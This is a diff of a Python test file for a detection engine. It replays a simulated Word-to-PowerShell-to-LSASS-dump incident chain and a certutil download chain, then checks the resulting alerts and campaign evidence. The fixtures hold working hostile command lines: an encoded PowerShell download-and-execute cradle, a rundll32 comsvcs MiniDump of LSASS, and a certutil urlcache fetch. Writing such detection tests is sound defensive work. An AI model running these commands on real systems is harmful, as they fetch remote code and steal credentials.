@@ -1,9 +1,14 @@
-"""Gate B — the certutil correlated-incident chain, through the wired-up engine.
+"""Gate B — a correlated multi-stage incident, through the wired-up engine.
 
-Two hand-built normalized events (certutil process-create, then that same
-process's outbound connection) must produce three alert rows: DET-PROC-003,
-DET-NET-006, and the PROV-CAMPAIGN incident joining them through the
-provenance graph.
+The incident chain is Word -> encoded PowerShell -> rundll32 dumping LSASS:
+Execution then Credential Access, three processes, one causal lineage. The
+LSASS dump anchors a PROV-CAMPAIGN that joins the stages.
+
+The certutil chain that used to be Gate B stays as a join test. It only ever
+formed a campaign because DET-PROC-003 listed a technique name ("Ingress Tool
+Transfer") as its tactic, which the engine counted as a second tactic. T1105 is
+Command and Control, the same tactic as the egress rule, so the honest result
+is two alerts and no campaign.
 """
 
 from __future__ import annotations
@@ -16,6 +21,7 @@ import manager.vendor_path  # noqa: F401
 from manager import migrations
 from manager.config import _DEFAULT_RULES_DIR
 from manager.detection.factory import build_detection_run
+from panopticon_detection.provenance.graph import EdgeKind
 
 _CMD = "certutil -urlcache -split -f http://www.msftconnecttest.com/connecttest.txt out.txt"
 
@@ -55,6 +61,34 @@ _CERTUTIL_NET = {
     },
 }
 
+_ENCODED = (
+    "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"
+    "AEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbAB3"
+    "AGEAcgBlAC5zAGgAIgApAA=="
+)
+
+
+def _proc(n: int, second: int, name: str, pid: int, cmd: str, parent: str, ppid: int) -> dict:
+    return {
+        "event_type": "process_create",
+        "event_id": "evt_" + "d" * 61 + f"{n:03d}",
+        "host_id": "HOST-B",
+        "timestamp": f"2026-08-31T13:00:{second:02d}.000Z",
+        "process": {"name": name, "pid": pid, "command_line": cmd},
+        "parent": {"name": parent, "pid": ppid},
+    }
+
+
+_WORD_CHAIN = [
+    _proc(1, 0, "winword.exe", 3000, '"winword.exe" "Urgent_Invoice.docx"', "explorer.exe", 1000),
+    _proc(2, 5, "powershell.exe", 4100, _ENCODED, "winword.exe", 3000),
+    _proc(
+        3, 30, "rundll32.exe", 4200,
+        "rundll32.exe comsvcs.dll, MiniDump 620 C:\\temp\\lsass.dmp full",
+        "powershell.exe", 4100,
+    ),
+]
+
 
 def _db(path: Path) -> sqlite3.Connection:
     conn = sqlite3.connect(path)
@@ -63,35 +97,52 @@ def _db(path: Path) -> sqlite3.Connection:
     return conn
 
 
-def test_certutil_chain_produces_three_alerts(tmp_path: Path) -> None:
+def _replay(tmp_path: Path, events: list[dict]):
     conn = _db(tmp_path / "p.db")
-    run, sink, writer, _context = build_detection_run(
+    run, sink, writer, context = build_detection_run(
         conn, alerts_path=tmp_path / "alerts.ndjson", rules_dir=_DEFAULT_RULES_DIR
     )
     try:
         sink.agent_id = "officer-agent-b"
-        run.process_event(dict(_CERTUTIL_PROC))
-        run.process_event(dict(_CERTUTIL_NET))
+        for event in events:
+            run.process_event(dict(event))
         conn.commit()
     finally:
         writer.close()
+    return conn, context
+
+
+def test_word_to_lsass_chain_produces_a_campaign(tmp_path: Path) -> None:
+    conn, _ = _replay(tmp_path, _WORD_CHAIN)
 
     rule_ids = {r["rule_id"] for r in conn.execute("SELECT rule_id FROM alerts")}
-    assert {"DET-PROC-003", "DET-NET-006", "PROV-CAMPAIGN"} <= rule_ids
+    assert {"DET-PROC-001", "DET-PROC-005", "PROV-CAMPAIGN"} <= rule_ids
 
     corr = conn.execute("SELECT * FROM alerts WHERE rule_id = 'PROV-CAMPAIGN'").fetchone()
     assert corr["host_id"] == "HOST-B"
-
-    # CORR-003 hardcoded mitre_technique T1105 on the correlation rule itself.
-    # A campaign is no longer a named rule with its own fixed mapping -- it is
-    # a traversal result, so it reports the technique of the detection that
-    # anchored the search (DET-NET-006, T1071). The full set of techniques the
-    # chain covers is in the evidence rather than flattened into one field.
-    assert corr["mitre_technique"] == "T1071"
+    # The campaign reports the technique of the detection that anchored the
+    # search -- the LSASS dump -- and lists every stage in its evidence.
+    assert corr["mitre_technique"] == "T1003.001"
     evidence = json.loads(corr["alert_json"])["evidence"]
-    # DET-PROC-003's own mitre.tactic is "Ingress Tool Transfer" (T1105);
-    # DET-NET-006's is "Command and Control" (T1071, the anchor). Both stages
-    # contribute a distinct tactic to the chain.
-    assert evidence["tactics_covered"] == ["Ingress Tool Transfer", "Command and Control"]
-    assert "DET-PROC-003" in evidence["attack_chain"]
-    assert "DET-NET-006" in evidence["attack_chain"]
+    # The encoded command also trips the obfuscation rule (Defense Evasion).
+    assert evidence["tactics_covered"] == ["Execution", "Defense Evasion", "Credential Access"]
+    assert "DET-PROC-001" in evidence["attack_chain"]
+    assert "DET-PROC-005" in evidence["attack_chain"]
+    assert evidence["root_cause_process"] == "winword.exe"
+    assert evidence["process_lineage"].endswith("winword.exe")
+
+
+def test_certutil_chain_joins_across_entity_ids_but_is_one_tactic(tmp_path: Path) -> None:
+    conn, context = _replay(tmp_path, [_CERTUTIL_PROC, _CERTUTIL_NET])
+
+    rule_ids = {r["rule_id"] for r in conn.execute("SELECT rule_id FROM alerts")}
+    assert {"DET-PROC-003", "DET-NET-006"} <= rule_ids
+    assert "PROV-CAMPAIGN" not in rule_ids
+
+    # The two events carry different entity_ids for the same process. The
+    # provenance registry still joins them: the connection hangs off the very
+    # node the process-create event produced.
+    forked = [e for e in context.graph.edges.values() if e.kind == EdgeKind.FORKED]
+    connected = [e for e in context.graph.edges.values() if e.kind == EdgeKind.CONNECTED_TO]
+    assert len(forked) == 1 and len(connected) == 1
+    assert connected[0].src == forked[0].dst
